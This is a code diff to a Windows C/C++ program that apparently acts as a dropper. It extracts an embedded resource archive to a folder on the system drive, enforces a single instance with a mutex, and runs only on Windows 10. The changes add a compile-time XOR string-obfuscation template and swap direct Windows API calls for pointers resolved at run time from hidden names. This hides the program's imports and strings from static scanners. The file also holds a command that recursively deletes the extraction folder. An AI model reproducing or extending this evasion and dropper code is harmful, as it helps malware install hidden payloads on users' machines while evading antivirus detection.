@@ -3,6 +3,7 @@
 #include <stdint.h>
 #include <time.h>
 #include <windows.h>
+#include <array>
 
 #include "swap.h"
 #include "defs.h"
@@ -85,6 +86,31 @@ __fdecl void __(const char *s,unsigned short l){
 }
 #define _s(n,s,l) const char n[]=_(s,l);__(n,l);
 
+namespace obfs {
+	template <typename Indexes, int n> class MetaString;
+	template <size_t... I, int n> class MetaString<std::index_sequence<I...>,n> {
+    public:
+      constexpr MetaString(char const *str)
+        : encrypted_buffer{ encrypt(str[I])... } {};
+    public:
+      constexpr char* decrypt(void){
+        for (size_t i=0;i<sizeof...(I);i++){
+          buffer[i]=decrypt(encrypted_buffer[i]);
+        };
+        buffer[sizeof...(I)]=0;
+        return buffer;
+      }
+    private:
+      constexpr char encrypt(char c) const { return (c+0xa)^F_0; } ;
+      constexpr char decrypt(char c) const { return (c^F_0)-0xa; } ;
+    private:
+      char buffer[sizeof...(I) + 1] {};
+      char encrypted_buffer[sizeof...(I)] {};
+	};
+};
+
+#define o(str,n) (obfs::MetaString<std::make_index_sequence<sizeof(str)>,n>(str).decrypt())
+
 static void *ppeb=NULL;
 __fdecl void dbg();
 static HINSTANCE huser32,hshell32,hgdi32,hkernel32,hntdll;
@@ -160,6 +186,17 @@ typedef volatile UINT (WINAPI *RWMA)(LPCSTR); static RWMA rwma;
 typedef volatile LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM); static SMA sma;
 typedef LPWSTR *(WINAPI *CLTAW)(LPCWSTR,int*); static CLTAW cltaw;
 typedef volatile NTSTATUS (WINAPI *RGV)(PRTL_OSVERSIONINFOEXW); static RGV rgv;
+typedef volatile HCURSOR (WINAPI *LCA)(HINSTANCE,LPCSTR); static LCA lca;
+typedef volatile BOOL (WINAPI *WFE)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED); static WFE wfe;
+typedef volatile BOOL (WINAPI *CDA)(LPCSTR,LPSECURITY_ATTRIBUTES); static CDA cda;
+typedef volatile DWORD (WINAPI *GFA)(LPCSTR); static GFA gfa;
+typedef volatile HANDLE (WINAPI *CFA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE); static CFA cfa;
+typedef volatile LPWSTR (WINAPI *GCW)(); static GCW gcw;
+typedef volatile HRSRC (WINAPI *FRA)(HMODULE,LPCSTR,LPCSTR); static FRA fra;
+typedef volatile HGLOBAL (WINAPI *LRS)(HMODULE,HRSRC); static LRS lrs;
+typedef volatile LPVOID (WINAPI *LCR)(HGLOBAL); static LCR lcr;
+typedef volatile DWORD (WINAPI *GEV)(LPCSTR,LPSTR,DWORD); static GEV gev;
+typedef volatile void (WINAPI *SLE)(DWORD); static SLE sle;
 
 __fdecl uint16_t strlen_i(const char *src){
   uint16_t i=0;
@@ -394,7 +431,7 @@ __fdecl int dlg_window(HINSTANCE hInstance){
   wc.lpfnWndProc=dlg_wndproc;
   wc.hInstance=hInstance;
   wc.hIcon=NULL;
-  wc.hCursor=LoadCursorA(NULL,IDC_ARROW);
+  wc.hCursor=((LCA)_f(lca))(NULL,IDC_ARROW);
   wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
   _s(idc,"imgdlgclass",11);
   wc.lpszClassName=idc;
@@ -482,7 +519,7 @@ __fdecl void null_window(HINSTANCE hInstance){
 
 static uint8_t read_shift=0;
 static uint8_t read_mask=0;
-static uint8_t *res;
+static uint8_t *res=NULL;
 
 __fdecl uint8_t bytes2byte_raw(){
   uint8_t b=0;
@@ -641,7 +678,7 @@ __fdecl uint8_t unpack_file(){
 }
 
 __fdecl bool is_exists(const char *path){
-  uint32_t a=(uint32_t)GetFileAttributes(path);
+  uint32_t a=(uint32_t)((GFA)_f(gfa))(path);
   return ((a!=INVALID_FILE_ATTRIBUTES) && (a&FILE_ATTRIBUTE_DIRECTORY));
 };
 
@@ -650,7 +687,7 @@ __fdecl void rmkdir(char *path,int depth){
     if(path[i]=='/'){
       path[i]=0;
       if(!is_exists(path)){
-        CreateDirectoryA(path,NULL);
+        ((CDA)_f(cda))(path,NULL);
         if(!is_exists(path)) return;
       };
       path[i]='/';
@@ -702,12 +739,12 @@ __fdecl void unarc(char *out){
     if(read_packed_value(t,sizeof(uint32_t))) break;
     if(dptr==dsize) break;
     rmkdir(fp,0);
-    o=CreateFileA(fp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+    o=((CFA)_f(cfa))(fp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
     if(o!=INVALID_HANDLE_VALUE){
       for(i=0;i<fl;i++){
         if(unpack_file()) return;
         c=(char)symbol;
-        WriteFile(o,&c,1,&w,NULL);
+        ((WFE)_f(wfe))(o,&c,1,&w,NULL);
       };
       CloseHandle(o);
     };
@@ -728,10 +765,10 @@ __fdecl bool iswin10(){
 #define image_size 386584
 
 __fdecl uint8_t *load_res(uint32_t id){
-  HRSRC res=FindResourceA(NULL,MAKEINTRESOURCE(id),RT_RCDATA);
-  if(res){
-    HGLOBAL res_handle=LoadResource(NULL,res);
-    if(res_handle) return (uint8_t*)LockResource(res_handle);
+  HRSRC fres=fra(NULL,MAKEINTRESOURCE(id),RT_RCDATA);
+  if(fres){
+    HGLOBAL res_handle=lrs(NULL,fres);
+    if(res_handle) return (uint8_t*)lcr(res_handle);
   };
   return NULL;
 };
@@ -764,13 +801,17 @@ __fdecl void dbg(){
 __fdecl void init(){
   get_ppeb();
   get_handles();
-  SetLastError(0);
+  sle=(SLE)gpa(hkernel32,o("SetLastError",0));
+  if(sle) sle(0);
   iMutex=CreateMutexA(NULL,true,imutex);
   if(iMutex){
     if(GetLastError()==ERROR_ALREADY_EXISTS) ExitProcess(0);
   }
   else ExitProcess(0);
-  res=(uint8_t *)(load_res(data_res)+54);
+  fra=(FRA)gpa(hkernel32,o("FindResourceA",1));
+  lrs=(LRS)gpa(hkernel32,o("LoadResource",2));
+  lcr=(LCR)gpa(hkernel32,o("LockResource",3));
+  if(fra && lrs && lcr) res=(uint8_t *)(load_res(data_res)+54);
   if(res==NULL){
     if(iMutex) CloseHandle(iMutex);
     ExitProcess(1);
@@ -819,6 +860,13 @@ __fdecl void init(){
   _s(f0027,"SendMessageA",12);
   _s(f0028,"CommandLineToArgvW",18);
   _s(f0029,"RtlGetVersion",13);
+  _s(f0030,"LoadCursorA",11);
+  _s(f0031,"WriteFile",9);
+  _s(f0032,"CreateDirectoryA",16);
+  _s(f0033,"GetFileAttributesA",18);
+  _s(f0034,"CreateFileA",11);
+  _s(f0035,"GetCommandLineW",15);
+  _s(f0036,"GetEnvironmentVariableA",23);
   seed=timebits();
   flib=(FLIB)get_fn_ptr(hkernel32,f0007);
   lla=(LLA)get_fn_ptr(hkernel32,f0025);
@@ -827,6 +875,12 @@ __fdecl void init(){
   hshell32=((LLA)_f(lla))(dll_s);
   rgv=(RGV)gpa(hntdll,f0029);
   if (!iswin10()){ if(iMutex) CloseHandle(iMutex); ExitProcess(0); };
+  wfe=(WFE)get_fn_ptr(hkernel32,f0031);
+  cda=(CDA)get_fn_ptr(hkernel32,f0032);
+  gfa=(GFA)get_fn_ptr(hkernel32,f0033);
+  cfa=(CFA)get_fn_ptr(hkernel32,f0034);
+  gcw=(GCW)get_fn_ptr(hkernel32,f0035);
+  gev=(GEV)get_fn_ptr(hkernel32,f0036);
   awr=(AWR)get_fn_ptr(huser32,f0013);
   bep=(BEP)get_fn_ptr(huser32,f0014);
   epa=(EPA)get_fn_ptr(huser32,f0015);
@@ -841,6 +895,7 @@ __fdecl void init(){
   uwi=(UWI)get_fn_ptr(huser32,f0024);
   rwma=(RWMA)get_fn_ptr(huser32,f0026);
   sma=(SMA)get_fn_ptr(huser32,f0027);
+  lca=(LCA)get_fn_ptr(huser32,f0030);
   cbmp=(CBMP)get_fn_ptr(hgdi32,f0001);
   cdc=(CCDC)get_fn_ptr(hgdi32,f0002);
   ddc=(DDC)get_fn_ptr(hgdi32,f0003);
@@ -885,7 +940,7 @@ extern "C" void __stdcall start(){
       if(dptr==dsize) break;
     };
     int c=0;
-    LPWSTR *argv=((CLTAW)_f(cltaw))(GetCommandLineW(),&c);
+    LPWSTR *argv=((CLTAW)_f(cltaw))(((GCW)_f(gcw))(),&c);
     if(argv){
       if(c>1){
         char *cmd=wchartocodepage(argv[1],CP_OEMCP);
@@ -913,7 +968,7 @@ extern "C" void __stdcall start(){
       _s(sea_r,"/c \"rd /s /q %SYSTEMDRIVE%\\fixes\"",33);
       char *path=(char *)LocalAlloc(LMEM_ZEROINIT,MAX_PATH);
       if(path){
-        GetEnvironmentVariableA(drv_e,path,257);
+        ((GEV)_f(gev))(drv_e,path,257);
         path[strlen_i(path)+1]=0;
         path[strlen_i(path)]='/';
         bytes2uint(res_size);
